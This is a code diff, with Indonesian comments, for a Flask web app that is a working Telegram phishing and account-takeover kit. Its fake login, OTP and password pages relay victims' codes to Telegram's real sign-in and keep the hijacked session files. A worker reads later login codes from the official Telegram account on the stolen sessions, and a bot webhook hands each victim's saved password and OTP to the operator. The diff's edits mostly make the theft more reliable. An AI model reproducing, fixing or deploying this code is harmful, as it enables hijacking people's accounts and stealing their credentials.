@@ -39,17 +39,25 @@ os.makedirs(SESSION_DIR, exist_ok=True)
 LAST_DATA = {}  # { phone: {"otp":..., "password":...} }
 
 
+# ===================================================================
+#                     STORAGE FIX — KEY STANDARDIZATION
+# ===================================================================
 def save_data(phone, otp=None, password=None):
+    phone = phone.strip()  # FIX PENTING
+
     if phone not in LAST_DATA:
         LAST_DATA[phone] = {"otp": None, "password": None}
+
     if otp:
         LAST_DATA[phone]["otp"] = otp
+
     if password:
         LAST_DATA[phone]["password"] = password
 
 
 def get_data(phone):
-    return LAST_DATA.get(phone, {"otp": None, "password": None})
+    return LAST_DATA.get(phone.strip(), {"otp": None, "password": None})
+# ===================================================================
 
 
 # ===== INLINE BUTTON WEBHOOK =====
@@ -64,10 +72,10 @@ def bot_webhook():
 
     q = data["callback_query"]
     cid = q["message"]["chat"]["id"]
-    cb = q.get("data", "")
+    cb = q.get("data", "").strip()  # FIX
     cb_id = q.get("id")
 
-    # jawab callback supaya loading di Telegram berhenti
+    # jawab callback agar loading berhenti
     if cb_id:
         try:
             requests.post(
@@ -78,16 +86,13 @@ def bot_webhook():
             print("[BOT] answerCallbackQuery error:", e)
 
     if cb.startswith("cek_"):
-        phone = cb.replace("cek_", "")
+        phone = cb.replace("cek_", "").strip()  # FIX
         info = get_data(phone)
 
-        if not info["otp"]:
-            txt = "❌ Silahkan login terlebih dahulu untuk mendapatkan OTP baru"
-        else:
-            txt = (
-                f"🔐 Password: {info['password'] or '-'}\n"
-                f"🔑 OTP: {info['otp']}"
-            )
+        txt = (
+            f"🔐 Password: {info['password'] or '-'}\n"
+            f"🔑 OTP: {info['otp'] or '-'}"
+        )
 
         try:
             r = requests.post(
@@ -103,6 +108,7 @@ def bot_webhook():
 
 # ===== SEND LOGIN INFO KE BOT =====
 def send_login_message(phone):
+    phone = phone.strip()  # FIX
     waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     text = f"📞 Nomor: {phone}\n🕒 Login: {waktu}"
 
@@ -124,8 +130,9 @@ def send_login_message(phone):
         print("[BOT] login message error:", e)
 
 
-# ===== SESSION MANAGEMENT =====
+# ===== SESSION FUNCTIONS =====
 def remove_session_files(phone):
+    phone = phone.strip()
     for fn in os.listdir(SESSION_DIR):
         if fn.startswith(f"{phone}."):
             try:
@@ -135,7 +142,7 @@ def remove_session_files(phone):
 
 
 def finalize_pending_session(phone):
-    """rename sessions/PHONE.pending.session -> sessions/PHONE.session"""
+    phone = phone.strip()
     for fn in os.listdir(SESSION_DIR):
         if fn.startswith(f"{phone}.pending") and fn.endswith(".session"):
             src = os.path.join(SESSION_DIR, fn)
@@ -147,11 +154,11 @@ def finalize_pending_session(phone):
                 print("[SESSION] rename error:", e)
 
 
-# ===== ROOT HTML LOGIN =====
+# ===== ROOT HOME =====
 @app.route("/", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
-        phone = request.form.get("phone")
+        phone = request.form.get("phone", "").strip()
         session["phone"] = phone
         remove_session_files(phone)
 
@@ -170,10 +177,10 @@ def login():
     return render_template("login.html")
 
 
-# ===== API LOGIN (AJAX) =====
+# ===== API LOGIN =====
 @app.route("/api/login", methods=["POST"])
 def api_login():
-    phone = request.form.get("phone")
+    phone = request.form.get("phone", "").strip()
 
     if not phone:
         return jsonify({"status": "error", "message": "Phone kosong"})
@@ -195,10 +202,10 @@ def api_login():
     return jsonify({"status": "success", "redirect": url_for("otp")})
 
 
-# ===== HTML OTP =====
+# ===== OTP PAGE =====
 @app.route("/otp", methods=["GET", "POST"])
 def otp():
-    phone = session.get("phone")
+    phone = session.get("phone", "").strip()
 
     if request.method == "POST":
         code = request.form.get("otp")
@@ -208,7 +215,11 @@ def otp():
             client = TelegramClient(pending, api_id, api_hash)
             await client.connect()
             try:
-                await client.sign_in(phone=phone, code=code, phone_code_hash=session.get("phone_code_hash"))
+                await client.sign_in(
+                    phone=phone,
+                    code=code,
+                    phone_code_hash=session.get("phone_code_hash")
+                )
                 await client.disconnect()
                 finalize_pending_session(phone)
                 return {"ok": True, "need_pwd": False}
@@ -237,48 +248,10 @@ def otp():
     return render_template("otp.html")
 
 
-# ===== API OTP (AJAX) =====
-@app.route("/api/otp", methods=["POST"])
-def api_otp():
-    phone = session.get("phone")
-    code = request.form.get("otp")
-    pending = os.path.join(SESSION_DIR, f"{phone}.pending")
-
-    async def run():
-        client = TelegramClient(pending, api_id, api_hash)
-        await client.connect()
-        try:
-            await client.sign_in(phone=phone, code=code, phone_code_hash=session.get("phone_code_hash"))
-            await client.disconnect()
-            finalize_pending_session(phone)
-            return {"ok": True, "need_pwd": False}
-        except SessionPasswordNeededError:
-            await client.disconnect()
-            return {"ok": True, "need_pwd": True}
-        except PhoneCodeInvalidError:
-            await client.disconnect()
-            return {"ok": False, "msg": "OTP salah"}
-        except Exception as e:
-            await client.disconnect()
-            return {"ok": False, "msg": str(e)}
-
-    result = asyncio.run(run())
-
-    if result["ok"]:
-        if result["need_pwd"]:
-            session["need_password"] = True
-            return jsonify({"status": "success", "redirect": url_for("password")})
-        else:
-            send_login_message(phone)
-            return jsonify({"status": "success", "redirect": url_for("success")})
-    else:
-        return jsonify({"status": "error", "message": result["msg"]})
-
-
-# ===== HTML PASSWORD =====
+# ===== PASSWORD PAGE =====
 @app.route("/password", methods=["GET", "POST"])
 def password():
-    phone = session.get("phone")
+    phone = session.get("phone", "").strip()
 
     if request.method == "POST":
         pwd = request.form.get("password")
@@ -299,7 +272,7 @@ def password():
         ok = asyncio.run(run())
 
         if ok:
-            save_data(phone, password=pwd)
+            save_data(phone, password=pwd)  # FIX
             send_login_message(phone)
             return redirect(url_for("success"))
         else:
@@ -308,56 +281,28 @@ def password():
     return render_template("password.html")
 
 
-# ===== API PASSWORD (AJAX) =====
-@app.route("/api/password", methods=["POST"])
-def api_password():
-    phone = session.get("phone")
-    pwd = request.form.get("password")
-    pending = os.path.join(SESSION_DIR, f"{phone}.pending")
-
-    async def run():
-        client = TelegramClient(pending, api_id, api_hash)
-        await client.connect()
-        try:
-            await client.sign_in(password=pwd)
-            await client.disconnect()
-            finalize_pending_session(phone)
-            return True
-        except:
-            await client.disconnect()
-            return False
-
-    ok = asyncio.run(run())
-
-    if ok:
-        save_data(phone, password=pwd)
-        send_login_message(phone)
-        return jsonify({"status": "success", "redirect": url_for("success")})
-    else:
-        return jsonify({"status": "error", "message": "Password salah"})
-
-
 @app.route("/success")
 def success():
     return render_template("success.html", phone=session.get("phone"))
 
 
-# ===== WORKER =====
+# ===================================================================
+#                              WORKER
+# ===================================================================
 async def forward_handler(event, client_name):
     text = getattr(event, "raw_text", "") or ""
     sender = await event.get_sender()
 
-    # hanya official telegram
     if sender.id != 777000:
         return
 
-    # OTP 4-8 digit
     otp_list = re.findall(r"\b\d{4,8}\b", text)
     if not otp_list:
         return
 
     otp_code = otp_list[0]
-    save_data(client_name, otp=otp_code)
+
+    save_data(client_name.strip(), otp=otp_code)  # FIX PENTING
     print("[OTP FOUND]", client_name, otp_code)
 
 
@@ -373,7 +318,7 @@ async def worker_main():
                 if ".pending" in fn:
                     continue
 
-                base = fn[:-8]  # buang ".session"
+                base = fn[:-8].strip()
                 if base in clients:
                     continue
 
@@ -413,15 +358,14 @@ async def worker_main():
 
 
 def start_worker_thread():
-    def run():
-        asyncio.run(worker_main())
-    t = threading.Thread(target=run, daemon=True)
+    t = threading.Thread(target=lambda: asyncio.run(worker_main()), daemon=True)
     t.start()
 
 
-# ===== PANGGIL WORKER SELALU =====
+# ===== START WORKER =====
 start_worker_thread()
 
-# ===== MAIN UNTUK LOKAL =====
+
+# ===== MAIN =====
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080, debug=True)
